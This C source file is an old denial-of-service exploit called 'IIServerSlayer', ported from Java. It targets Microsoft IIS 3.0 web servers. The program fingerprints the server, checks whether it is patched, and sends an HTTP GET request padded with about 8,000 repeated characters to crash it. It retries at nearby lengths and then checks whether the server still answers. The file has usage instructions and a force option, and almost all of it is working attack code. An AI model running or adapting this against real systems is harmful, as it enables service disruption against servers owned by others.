/* Some days ago I found the page http://www.eden.com/~tfast/jihad.html
   Then I found the java program IIServerSlayer.class made by
   Todd Fast <tfast@eden.com>, the author of the web pages.
   Now I have ported that program in gcc from java using strace and
   disassembling IIServerSlayer.class with javap (part of jdk).

   For now is tested by me only on Linux 2.1.42 compiled with gcc 2.7.2.2
   and glibc.
                by Andrea Arcangeli <arcangeli@mbox.queen.it> */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>

int s;
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;

int open_sock(int sock, char *server, int port) {
  struct sockaddr_in blah;
  struct hostent *he;
  bzero((char *)&blah,sizeof(blah));
  blah.sin_family=AF_INET;
  blah.sin_port=htons(port);
  if ((he = gethostbyname(server)) != NULL) {
    bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
  }
  else {
    if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
      perror("gethostbyname()");
      return(2);
    }
  }
  if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
    perror("connect()");
    close(sock);
    return(3);
  }
  return 0;
}

char *generate_die_string(int lenght) {
  char letter='X';
  char *str_begin = "GET /?bye=",*str_end = " HTTP/1.0\r\n\r\n",*str;
  int i;
  str = (char *)malloc(lenght+strlen(str_end)+strlen(str_begin)+1);
  strcpy(str,str_begin);
  for(i=strlen(str_begin);i<lenght+strlen(str_begin);i++) str[i] = letter;
  str[i]=0;
  strcat(str,str_end);
  return (char *)str;
}

void IIServerSlayer(char *target,int lenght,int port,int flags) {
  char buff[2],header[512],*IIS_string = "Server: Microsoft-IIS/3.0";
  char *IIS_patch = "Bad Request";
  int count = 0,return_status;
  if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
    perror("socket()");
    exit(1);
  }
  if((return_status = open_sock(s,target,port))) exit(return_status);
  if(lenght) printf("Sending request lenght = %d to %s\n",lenght,target);
  else printf("Sending request to test if %s is a Microsoft-IIS/3.0 server\n"
              ,target);
  send(s,generate_die_string(lenght),strlen(generate_die_string(lenght)),0);
  printf("Waiting for the reply from %s\n",target);
  buff[1]=0;
  while(recv(s,buff,1,0) == 1) {
    if(flags & 1) printf("%s",buff);
    else if(!div(count,50).rem) printf(".");
    if(count < 511) header[count]=buff[0];
    count++;
  }
  printf("\n");
  header[511]=0;
  if(strstr(header,IIS_string) == NULL && lenght == 0) {
    printf("This is not a Microsoft-IIS/3.0 web server\n");
    if(!(flags & 2)) exit(0);
  }
  else if(!lenght) printf("Ok, this is a Microsoft-IIS/3.0 web server\n");
  if(strstr(header,IIS_patch) != NULL) {
    printf("This IIS/3.0 web server is patched against this exploit\n");
    if(!(flags & 2)) exit(0);
  }
  close(s);
}

void main(int argc,char **argv)
{
  int i = 1,port = 80,lenght = 8180,flags = 0,param = 0,pid;
  if (argc < 2 ) {
    printf("Usage: %s [-v] [-f] <target> [string_lenght] [port]\n",argv[0]);
    printf("[-v] = verbose mode to view the server reply\n");
    printf("[-f] = force running over non or patched IIS/3.0 web server\n");
    exit(0);
  }
  for(i=1;i<argc;i++) {
    if(!strcmp(argv[i],"-v")) { param++; flags |= 1; }
    if(!strcmp(argv[i],"-f")) { param++; flags |= 2; }
  }
  if(argc > param+2) lenght = atoi(argv[param+2]);
  if(argc > param+3) port = atoi(argv[param+3]);
  for(i=0;i<3;i++,lenght++) {
    if(i) IIServerSlayer(argv[param+1],lenght,port,flags);
    else IIServerSlayer(argv[param+1],0,port,flags);
    if(i == 1 || i == 0) lenght--;
  }
  if((pid = fork())) {
    if(pid == -1) {
      perror("I can' t fork\n");
      exit(-1);
    }
    usleep(60000000); /* wait for 1 minute */
    kill(pid,SIGTERM);
  }
  else {
    IIServerSlayer(argv[param+1],lenght,port,flags);
    printf("Sorry, %s is alive yet\n",argv[param+1]);
  }
  exit(0);
}




